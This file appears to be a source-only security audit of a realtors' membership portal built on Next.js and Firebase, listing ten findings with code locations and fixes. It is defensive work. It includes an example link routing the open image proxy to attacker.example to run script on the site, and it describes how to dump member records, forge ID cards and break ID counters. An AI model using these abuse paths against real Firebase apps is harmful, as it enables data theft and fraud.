@@ -1,0 +1,458 @@
+SECURITY AUDIT - Realtors Media portal (relatorsmedia)
+======================================================
+Date:        2026-10-07
+Source ref:  main @ 6383a75 (clean worktree)
+Method:      cloudflare/security-audit skill, source-only review
+Scope:       ./src (88 files, ~18.8k lines) plus the files that enforce its
+             trust boundaries: firestore.rules, storage.rules, next.config.ts,
+             package.json. Build output (out/, .next/, .firebase/) not reviewed.
+
+FIX STATUS (updated 2026-10-07, changes in the working tree, not committed)
+---------------------------------------------------------------------------
+The findings below are kept as originally written. Status of each:
+
+  1  FIXED     Proxy only fetches this project's Firebase Storage photos,
+               raster types only, 10 MB cap, 10 s timeout, no redirects, no
+               CORS header. Tested locally against the built app.
+  2  PARTLY    Rules now restrict what a member can write on their own card
+               and profile: fixed list of designations, tier must match the
+               ID prefix, validity capped, ID must come from the sequence,
+               photo must be a Storage URL, field allowlist. The members
+               fallback on /verify is removed.
+               NOT fixed: tier is still self-selected with no payment check
+               (payment gateway deferred by the owner), and issuedBy is
+               still written by the client, so it is not proof of who
+               issued a card.
+  3  FIXED     Property images: admin-only write, jpeg/png/webp only.
+  4  PARTLY    Public listing of members and idCards removed; members
+               profiles are now private. NOT fixed: /verify/<id> still shows
+               phone and email for one card, and IDs are sequential.
+  5  FIXED     Counters move at most 50 per write, three fixed counter IDs.
+               A determined user can still burn numbers 50 at a time.
+  6  FIXED     Members cannot delete their profile; suspended or retired
+               cards stay that way; a suspended profile cannot create a new
+               card. The admin must suspend the members record, not only
+               the card.
+  7  PARTLY    next 16.4.0, npm audit fix applied. Remaining in production
+               dependencies: @grpc/grpc-js via firebase (server-side
+               advisories; the only offered fix downgrades firebase).
+  8  FIXED     leads fully size-limited; classifieds admin-write only.
+  9  FIXED     Public counter bump removed (nothing in src used it).
+ 10  FIXED     Password reset shows the same message either way and no
+               longer displays the email.
+  C  FIXED     Storage content types are an exact allowlist.
+  Issuer passwords now need at least 10 characters.
+
+NOT DONE, NEEDS THE OWNER
+  - Deploy the rules: firebase deploy --only firestore:rules,storage
+    Deploy the site and the rules together; the new client code and the
+    new rules depend on each other. The rules were not run in an emulator.
+  - Item B (admin identified by email): needs a custom claim set with the
+    Admin SDK, plus MFA on the admin account.
+  - App Check: enable in the Firebase console.
+  - The signature image in public/images is still publicly downloadable.
+
+
+HOW TO READ THIS
+----------------
+Every finding below was traced in source. Nothing was run against the live
+site or the live Firebase project, so no finding was reproduced end to end.
+"Confirmed" means the code and rules permit it as written. Items that depend
+on something not visible in the repository are listed separately under
+NEEDS VALIDATION and carry no severity.
+
+This was a single-pass review by one reviewer. The skill's full workflow uses
+several independent hunter and verifier agents and writes JSON artifacts; that
+was not done here, so treat coverage as partial, not exhaustive.
+
+The app has no server of its own apart from one API route. All data access
+goes from the browser straight to Firebase, so firestore.rules and
+storage.rules ARE the security boundary. Client-side checks (zod schemas, the
+admin sign-in screen, the payment step) protect nothing on their own, because
+anyone can call Firebase directly with the public config in
+src/lib/firebase/config.ts.
+
+SUMMARY
+-------
+  #  Severity  Finding
+  1  HIGH      Image proxy serves attacker content on the site's own origin
+               (script execution) and fetches any URL (SSRF / open proxy)
+  2  HIGH      Any signed-up user can mint a "verified" ID card of any tier,
+               designation and validity, with no payment
+  3  HIGH      Property image storage: anyone can upload/overwrite, any
+               signed-in user can delete
+  4  MEDIUM    All member and ID-card records (name, phone, email, photo) can
+               be dumped by anyone despite the "single lookup" rule
+  5  MEDIUM    Any signed-up user can permanently break member ID issuance
+               via the counters collection
+  6  MEDIUM    Admin suspension of a member or card can be undone by the
+               member
+  7  MEDIUM    Dependencies with known advisories (next 16.3.5 critical)
+  8  LOW       Unauthenticated, unbounded writes to leads and classifieds
+  9  LOW       Anyone can inflate property view / lead counters
+ 10  LOW       Member ID reveals the registered email; accounts enumerable
+
+Open sign-up matters for 2, 3, 5 and 6: "signed-in user" means anyone on the
+internet who creates an account with an email and a 6-character password.
+
+
+==========================================================================
+1. HIGH - Image proxy: script execution on the site origin, SSRF, open proxy
+==========================================================================
+File:  src/app/api/proxy-image/route.ts (whole file)
+Used:  src/lib/utils/imageUtils.ts:18-21, 34-37
+
+What the code does
+  GET /api/proxy-image?url=<anything> needs no login. It accepts any http or
+  https URL, fetches it from the server (following redirects), and returns
+  the body with the upstream Content-Type (line 40, 46) and
+  Access-Control-Allow-Origin: * (line 48). There is no host allowlist, no
+  content-type check, no size limit and no timeout.
+
+Why it matters
+  a) Script execution on your domain. If the upstream answers text/html or
+     image/svg+xml, the browser renders it as a page of
+     www.realtorsmedia.world. A link such as
+       /api/proxy-image?url=https://attacker.example/page.html
+     runs the attacker's JavaScript in your origin. The CSP in
+     next.config.ts:7 has no script-src or default-src, so it does not stop
+     this. That script can read the member's Firebase login stored in the
+     browser (the main app uses default persistent auth) and act as that
+     member, or frame /admin (X-Frame-Options is SAMEORIGIN) and capture the
+     admin password as it is typed. One click by a logged-in member or the
+     admin is enough.
+  b) The response is cached for a week at the CDN (s-maxage=604800,
+     line 47), so the malicious page keeps being served from your domain.
+  c) SSRF: the server will request internal or link-local addresses on the
+     attacker's behalf and hand back the response, readable cross-origin
+     because of the wildcard CORS header. What is reachable depends on the
+     host (see NEEDS VALIDATION A).
+  d) Open proxy / cost: anyone can pull arbitrary large files through your
+     function. The whole body is buffered in memory (line 41).
+  e) No click needed to trigger a fetch: a member can put any URL in their
+     own card's photoUrl (uploadMemberPhoto returns http(s) strings
+     unchanged, src/lib/firebase/storage.ts:107-115). The admin dashboard
+     and /verify then load it through the proxy
+     (src/app/admin/page.tsx:841, 922).
+
+Fix
+  - Allow only https and only the hosts you actually use
+    (firebasestorage.googleapis.com, *.firebasestorage.app,
+    storage.googleapis.com). Reject everything else before fetching.
+  - Use redirect: "error" (or re-check the host after each redirect).
+  - Reject responses whose content-type is not image/png, image/jpeg,
+    image/webp, image/gif or image/avif. Never pass through SVG or HTML.
+    Send the response with Content-Disposition: inline and
+    Content-Security-Policy: default-src 'none'; sandbox.
+  - Cap the size (for example 10 MB via content-length and while reading)
+    and add an AbortSignal timeout.
+  - Replace Access-Control-Allow-Origin: * with nothing; the callers are
+    same-origin.
+  - Better: drop the proxy and configure CORS on the storage bucket, which
+    is the reason the proxy exists.
+
+
+==========================================================================
+2. HIGH - Self-issued "verified" ID cards: any tier, any title, no payment
+==========================================================================
+Files: firestore.rules:79-100 (idCards), 45-60 (members)
+       src/components/ui/IdCardModal.tsx:466-482, 1376-1415
+       src/app/verify/[id]/VerifyClient.tsx:45-103
+
+What the code does
+  The rule isOwnMemberCard() lets any signed-in user create or update
+  idCards/{cardId} as long as uid is their own, cardType is "member" and the
+  ID does not start with RM-E-. No other field is checked. The members rule
+  only checks the uid field. Payment is a QR image followed by a "Done"
+  button that calls saveCard(); nothing records or checks that money moved.
+
+Why it matters
+  The /verify page shows a green "verified" result for any idCards document
+  with status ACTIVE. A user can therefore write, directly to Firestore:
+    - cardTier "orange" (VIP Elite) without paying for it,
+    - any designation and department ("MANAGING DIRECTOR", "LEGAL CELL"),
+    - any validTill (2099), any issuedBy (naming a real issuer or the admin),
+    - any free ID, including low or memorable numbers (RM-A-1).
+  The public registry then vouches for it and the card can be printed with
+  the official signature. The verification product does not verify anything
+  for member cards.
+
+  A second path: VerifyClient falls back to the members collection by
+  employeeId (line 80). A user can set employeeId "RM-E-<unused number>" in
+  their own members document (the RM-E block exists only on idCards), and
+  /verify/RM-E-... reports it as verified.
+
+Fix
+  Client-written cards cannot be trusted as credentials. Move issuance to
+  trusted code (a Cloud Function or a Next.js route using the Admin SDK)
+  that sets tier, designation, dates, status and ID itself, after payment is
+  confirmed by the payment provider's webhook. Then in firestore.rules:
+    - idCards: allow create/update only for admin and issuers; let members
+      update at most a short allowlist (phone, location, agencyName, photo)
+      with affectedKeys().hasOnly([...]).
+    - members: same allowlist approach; make status, selectedTier, tier,
+      designation, department, employeeId, validTill, issuedDate and
+      issuedBy read-only for the owner.
+  Remove the members fallback in VerifyClient, or apply the RM-E block to
+  members.employeeId as well.
+  If a short-term patch is needed before that: new self-registered cards
+  should be written with status "PENDING" (rule-enforced) and only an
+  admin/issuer can set ACTIVE.
+
+
+==========================================================================
+3. HIGH - Property images: public upload/overwrite, delete by any user
+==========================================================================
+File:  storage.rules:33-37
+
+What the code does
+    match /properties/{allPaths=**} {
+      allow read: if true;
+      allow create, update: if isImageUnder(5 * 1024 * 1024);
+      allow delete: if isAdmin() || request.auth != null;
+    }
+  create and update have no auth condition at all. delete accepts any
+  signed-in account.
+
+Why it matters
+  - Anyone, without an account, can upload unlimited files of up to 5 MB
+    each into your bucket: storage and egress cost, and free hosting of
+    arbitrary content under your project. The "image" check only looks at
+    the content type the uploader declares, not at the bytes.
+  - Anyone can overwrite an existing listing photo. The object path is
+    visible in the public imageUrl of every property document.
+  - Anyone who signs up can delete every property photo.
+  firestore.rules says property creation is admin-only; the storage side
+  does not match that.
+
+Fix
+    match /properties/{allPaths=**} {
+      allow read: if true;
+      allow create: if isAdmin() && isImageUnder(5 * 1024 * 1024);
+      allow update, delete: if isAdmin();
+    }
+  If members are meant to upload, use /properties/{uid}/... with
+  request.auth.uid == uid, as the members path already does.
+  Note that "allow read" also grants listing of the folder; use
+  "allow get" if listing is not wanted (applies to /members too).
+
+
+==========================================================================
+4. MEDIUM - Whole member / ID-card directory can be dumped by anyone
+==========================================================================
+File:  firestore.rules:34-36, 46-47, 72-75
+
+What the code does
+  isSingleLookup() is "request.query.limit <= 1". members and idCards allow
+  list when that holds, with no login. The comment says bulk listing of
+  personal data is not allowed.
+
+Why it matters
+  A limit of 1 does not stop paging. A client can order by document ID and
+  repeat the query with startAfter(lastDoc), reading the whole collection
+  one document at a time. Each record holds full name, phone, email, city,
+  licence number and photo; employee cards are included. IDs are also
+  sequential (RM-C-1111, 1112, ...), so walking /verify gives the same
+  result. Severity is medium rather than high because /verify already shows
+  phone and email per card by design; what fails is the stated control
+  against bulk collection.
+
+Fix
+  - Stop exposing phone and email publicly. Keep a small public document
+    per card (name, designation, photo, status, validity) and put contact
+    details in a document only the owner, issuers and admin can read.
+  - Remove the public list rule. Lookups the app needs before login
+    (Member ID -> email for sign-in and password reset) should go through
+    a server endpoint that returns nothing to the caller.
+  - Turn on Firebase App Check for Firestore and Storage to raise the cost
+    of scripted access.
+
+
+==========================================================================
+5. MEDIUM - Any user can permanently break member ID issuance
+==========================================================================
+File:  firestore.rules:195-224
+
+What the code does
+  For counters named memberSequence*, isValidCounterWrite() requires only a
+  signed-in user and 1110 < currentSequence < 100000000, never decreasing.
+
+Why it matters
+  A user can set counters/memberSequence_green (and _blue, _orange) to
+  99999999. The next card needs 100000000, which the rule rejects, so
+  getNextEmployeeId() fails for everyone; its fallback
+  (src/lib/firebase/db.ts:830-838) then hands out the same ID to every new
+  registrant. Only an admin deleting the counter recovers it. A milder
+  version skips the numbering ahead by any amount. The same user can also
+  pre-create idCards documents on upcoming IDs (finding 2), which makes the
+  50-attempt collision loop (db.ts:796) run out.
+  The pattern '^memberSequence_.*' additionally lets users create unlimited
+  extra counter documents.
+
+Fix
+  Allocate IDs in trusted server code (same change as finding 2) and make
+  counters admin/server-write only. If it must stay client-side for now,
+  require currentSequence == resource.data.currentSequence + 1 on update
+  and list the three allowed counter IDs explicitly (drop the regex).
+
+
+==========================================================================
+6. MEDIUM - Suspension by the admin can be undone by the member
+==========================================================================
+File:  firestore.rules:55-64, 88-100
+
+What the code does
+  Update rules stop an owner changing status away from SUSPENDED. But:
+    - members: the owner may delete their own document (line 62-64) and
+      create it again with status ACTIVE (line 50-52).
+    - idCards: the owner cannot edit the suspended card, but can create a
+      brand-new card under another ID with status ACTIVE (line 88-90).
+    - A card retired as SUPERSEDED can be set back to ACTIVE by its owner;
+      only SUSPENDED is locked (line 99).
+
+Why it matters
+  A member removed for misconduct keeps a verifying card.
+
+Fix
+  Remove owner delete on members. Make status writable only by admin (see
+  finding 2). Enforce one active card per uid in the server-side issuing
+  code, and disable the Firebase Auth account when suspending.
+
+
+==========================================================================
+7. MEDIUM - Dependencies with published advisories
+==========================================================================
+Source: npm audit --omit=dev, run 2026-10-07 (7 advisories: 1 critical,
+        6 high)
+
+  next 16.3.5       CRITICAL  GHSA-vcvr-r3jv-pc5j, remote code execution in
+                              next/og ImageResponse. src does not import
+                              next/og or define opengraph-image routes, so
+                              the vulnerable path is not used today. Fixed
+                              in 16.4.0.
+  sharp < 0.35.5    HIGH      GHSA-wq5f-xc86-pv6w (librsvg). Reached through
+                              the Next image optimizer, which accepts remote
+                              images from the hosts in next.config.ts.
+  @grpc/grpc-js     HIGH      via firebase/firestore. Both advisories are
+                              about gRPC servers; this app is only a client.
+  source-map-js     HIGH      build-time only.
+
+Fix
+  Bump next (and eslint-config-next) to 16.4.0 or later, then run
+  npm audit fix. Do not run "npm audit fix --force": it proposes
+  downgrading firebase to 9.14.0. Severity is medium because no advisory
+  was shown to be reachable from this code.
+
+
+==========================================================================
+8. LOW - Unauthenticated, unbounded writes to leads and classifieds
+==========================================================================
+File:  firestore.rules:157-165, 184-187
+
+  leads: anyone can create a lead for any memberUid. Only name, phone and
+  message have length limits; email, propertyName, budget and propertyId do
+  not (documents up to 1 MB). A member's inbox can be flooded.
+  classifieds: create checks only two optional fields and has no key
+  allowlist, so anyone can store arbitrary data (including verified: true,
+  featured: true) in a publicly listable collection. Nothing in src reads
+  this collection yet, so today the effect is cost and abuse hosting; it
+  becomes stored-content injection the day the page reads from it.
+
+Fix
+  Add hasOnly([...]) and size limits for every field on both collections,
+  force verified/featured to false on create, require App Check, and
+  consider requiring sign-in for classifieds.
+
+
+==========================================================================
+9. LOW - Property view / lead counters can be inflated by anyone
+==========================================================================
+File:  firestore.rules:136-147
+
+  isCounterBump() lets any caller, logged in or not, add 1 to views and
+  leads as many times as they like (fractions also pass). Figures shown to
+  members and admins can be faked. Count views server-side, or accept the
+  numbers as untrusted and do not present them as audited.
+
+
+==========================================================================
+10. LOW - Member ID reveals the registered email; accounts enumerable
+==========================================================================
+Files: src/lib/firebase/auth.ts:270-281, src/app/forgot-password/page.tsx:148
+       src/components/RightSidebar/MemberLogin.tsx:42-49
+
+  The forgot-password flow resolves a Member ID to its email in the browser
+  and displays it ("sent to <email>"); the login box does the same lookup
+  and reports "No registered member was found". With sequential IDs this
+  maps every ID to an email and lets anyone send reset mails to every
+  member. It is the same root cause as finding 4 and goes away with the
+  same server-side lookup. Always show a neutral message.
+
+
+NEEDS VALIDATION (cannot be decided from the repository)
+--------------------------------------------------------
+A. SSRF reach of the image proxy (finding 1c). Which internal addresses
+   the function can reach depends on where it runs (Vercel function vs. a
+   container or VM with a metadata service). Check from the hosting side.
+
+B. Admin identity is a bare email string. firestore.rules:16-20 and
+   storage.rules:4-6 grant admin to any token whose email is
+   admin@realtorsmedia.com, without checking email_verified. Sign-up is
+   open. If that Firebase Auth account is ever deleted, or was created with
+   a provider that allows the address to be claimed again, the first person
+   to register it becomes admin. Confirm in the Firebase console that the
+   account exists and cannot be deleted casually. Recommended regardless:
+   use a custom claim (request.auth.token.admin == true) and enable MFA.
+
+C. SVG block in storage.rules:15-19 is case-sensitive
+   ('image/svg.*'). Whether Cloud Storage preserves an upload declared as
+   "image/SVG+xml" is not visible here. If it does, the block is bypassed.
+   Simplest fix either way: allowlist
+   contentType in ['image/jpeg','image/png','image/webp'].
+
+D. Deployed rules vs. repository. Everything above assumes the rules files
+   in this commit are what is deployed. Compare them in the Firebase
+   console.
+
+
+CHECKED AND NOT REPORTED
+------------------------
+- Firebase web config hardcoded in src/lib/firebase/config.ts: these values
+  are public identifiers by design, not secrets. No private keys, service
+  accounts or .env files are tracked in git.
+- React output: no dangerouslySetInnerHTML or innerHTML in src; user data is
+  rendered as text. href values built from stored data are either
+  admin-authored or use tel:/mailto: prefixes.
+- printIdCardPng (src/lib/utils/exportIdCard.ts:54-85) writes HTML with
+  document.write, but the title is stripped of markup and the image is a
+  locally generated PNG data URL.
+- staff collection: admin-only writes, issuer can read only its own record.
+- Admin and issuer sessions are held in memory only and are enforced again
+  by the rules, not just by the sign-in screen.
+- src/lib/firebase/functions.ts calls /api/functions/* routes that do not
+  exist in this repository, and src/lib/server/requestGuards.ts is unused.
+  Not a vulnerability, but the post-property page shows a success reference
+  number even when nothing was saved.
+
+OUTSIDE src, WORTH KNOWING
+--------------------------
+- public/images/ serves a named person's signature as standalone PNG files.
+  Anyone can download a clean copy to place on forged documents. Consider
+  compositing it into the card template server-side instead.
+- Password policy is 6 characters plus one symbol
+  (src/lib/validation/idCardSchemas.ts:3) and also applies to issuer
+  accounts, which can create employee cards. Use a longer minimum for staff.
+
+
+SUGGESTED ORDER OF WORK
+-----------------------
+1. Lock down /api/proxy-image (finding 1). Small change, removes the only
+   path to script execution on the site.
+2. Fix storage.rules for /properties (finding 3). Three-line change.
+3. Tighten counters and remove owner delete on members (findings 5, 6).
+   Rule-only changes.
+4. Upgrade next and run npm audit fix (finding 7).
+5. Move card issuance, ID allocation and payment confirmation to server
+   code and split public from private card data (findings 2, 4, 10). This
+   is the real fix for the registry and needs design work.
+6. Field allowlists and App Check for leads and classifieds (finding 8).
